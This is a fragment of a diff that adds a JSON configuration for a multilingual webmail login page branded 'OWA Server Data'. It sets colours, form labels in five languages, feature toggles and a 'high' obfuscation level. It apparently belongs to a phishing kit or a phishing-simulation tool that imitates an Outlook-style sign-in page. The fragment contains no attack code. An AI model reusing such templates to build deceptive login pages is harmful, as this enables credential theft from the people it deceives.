+    "type": "email-login",
+    "enabled": true,
+    "isDefault": false,
+    "theme": {
+      "primaryColor": "#1e7fb8",
+      "secondaryColor": "#2b95c8",
+      "backgroundColor": "#1e7fb8",
+      "textColor": "#FFFFFF",
+      "accentColor": "#8cbd27"
+    },
+    "background": {
+      "type": "color",
+      "value": "linear-gradient(135deg, #1e7fb8 0%, #2b95c8 100%)"
+    },
+    "logo": {
+      "text": "OWA Server Data",
+      "width": 200,
+      "height": 60
+    },
+    "layout": {
+      "containerWidth": "500px",
+      "formPosition": "center",
+      "showHeader": false,
+      "showFooter": false
+    },
+    "translations": {
+      "en": {
+        "title": "OWA Server Data",
+        "emailLabel": "Login (email)",
+        "emailPlaceholder": "Login (email)",
+        "passwordLabel": "Password",
+        "passwordPlaceholder": "Password",
+        "submitButton": "LOGIN",
+        "forgotPassword": "Forgot password?",
+        "rememberMe": "Remember me",
+        "createAccount": "Create account",
+        "termsOfService": "Terms",
+        "privacyPolicy": "Privacy",
+        "errorMessages": {
+          "invalidEmail": "Please enter your email address",
+          "invalidPassword": "Please enter your password",
+          "accountLocked": "Account locked",
+          "serverError": "Login failed. Please try again."
+        },
+        "notices": {
+          "webmailTab": "Webmail",
+          "servicesTab": "My Services",
+          "welcome": "Welcome to your Webmail & Account Settings",
+          "loginNote": "Secure webmail access"
+        }
+      },
+      "ja": {
+        "title": "OWA サーバーデータ",
+        "emailLabel": "ログイン (メール)",
+        "emailPlaceholder": "ログイン (メール)",
+        "passwordLabel": "パスワード",
+        "passwordPlaceholder": "パスワード",
+        "submitButton": "ログイン",
+        "forgotPassword": "パスワードをお忘れですか？",
+        "rememberMe": "ログイン状態を保持",
+        "createAccount": "アカウント作成",
+        "termsOfService": "利用規約",
+        "privacyPolicy": "プライバシー",
+        "errorMessages": {
+          "invalidEmail": "メールアドレスを入力してください",
+          "invalidPassword": "パスワードを入力してください",
+          "accountLocked": "アカウントがロックされています",
+          "serverError": "ログインに失敗しました。もう一度お試しください。"
+        },
+        "notices": {
+          "webmailTab": "Webmail",
+          "servicesTab": "マイサービス",
+          "welcome": "Webmailとアカウント設定へようこそ",
+          "loginNote": "安全なWebメールアクセス"
+        }
+      },
+      "ko": {
+        "title": "OWA 서버 데이터",
+        "emailLabel": "로그인 (이메일)",
+        "emailPlaceholder": "로그인 (이메일)",
+        "passwordLabel": "암호",
+        "passwordPlaceholder": "암호",
+        "submitButton": "로그인",
+        "forgotPassword": "암호를 잊으셨나요?",
+        "rememberMe": "로그인 상태 유지",
+        "createAccount": "계정 만들기",
+        "termsOfService": "이용약관",
+        "privacyPolicy": "개인정보",
+        "errorMessages": {
+          "invalidEmail": "이메일 주소를 입력하세요",
+          "invalidPassword": "암호를 입력하세요",
+          "accountLocked": "계정이 잠겼습니다",
+          "serverError": "로그인에 실패했습니다. 다시 시도하세요."
+        },
+        "notices": {
+          "webmailTab": "Webmail",
+          "servicesTab": "내 서비스",
+          "welcome": "Webmail 및 계정 설정에 오신 것을 환영합니다",
+          "loginNote": "안전한 웹메일 액세스"
+        }
+      },
+      "de": {
+        "title": "OWA Server Daten",
+        "emailLabel": "Anmeldung (E-Mail)",
+        "emailPlaceholder": "Anmeldung (E-Mail)",
+        "passwordLabel": "Kennwort",
+        "passwordPlaceholder": "Kennwort",
+        "submitButton": "ANMELDEN",
+        "forgotPassword": "Kennwort vergessen?",
+        "rememberMe": "Angemeldet bleiben",
+        "createAccount": "Konto erstellen",
+        "termsOfService": "Bedingungen",
+        "privacyPolicy": "Datenschutz",
+        "errorMessages": {
+          "invalidEmail": "Bitte geben Sie Ihre E-Mail-Adresse ein",
+          "invalidPassword": "Bitte geben Sie Ihr Kennwort ein",
+          "accountLocked": "Konto gesperrt",
+          "serverError": "Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut."
+        },
+        "notices": {
+          "webmailTab": "Webmail",
+          "servicesTab": "Meine Dienste",
+          "welcome": "Willkommen bei Ihrer Webmail & Kontoeinstellungen",
+          "loginNote": "Sicherer Webmail-Zugriff"
+        }
+      },
+      "es": {
+        "title": "Datos del servidor OWA",
+        "emailLabel": "Inicio de sesión (correo)",
+        "emailPlaceholder": "Inicio de sesión (correo)",
+        "passwordLabel": "Contraseña",
+        "passwordPlaceholder": "Contraseña",
+        "submitButton": "INICIAR SESIÓN",
+        "forgotPassword": "¿Olvidó su contraseña?",
+        "rememberMe": "Recordarme",
+        "createAccount": "Crear cuenta",
+        "termsOfService": "Términos",
+        "privacyPolicy": "Privacidad",
+        "errorMessages": {
+          "invalidEmail": "Ingrese su dirección de correo electrónico",
+          "invalidPassword": "Ingrese su contraseña",
+          "accountLocked": "Cuenta bloqueada",
+          "serverError": "Error al iniciar sesión. Inténtelo de nuevo."
+        },
+        "notices": {
+          "webmailTab": "Webmail",
+          "servicesTab": "Mis servicios",
+          "welcome": "Bienvenido a su Webmail y configuración de cuenta",
+          "loginNote": "Acceso seguro al correo web"
+        }
+      }
+    },
+    "defaultLanguage": "en",
+    "autoDetectLanguage": true,
+    "features": {
+      "showLogo": true,
+      "showNotices": false,
+      "showCaptcha": false,
+      "showRememberMe": true,
+      "showForgotPassword": true,
+      "showCreateAccount": false,
+      "showSoftKeyboard": false
+    },
+    "obfuscationLevel": "high",
+    "createdAt": 1763113578205,
+    "updatedAt": 1763113578205,
+    "createdBy": "system"
+  }
+]
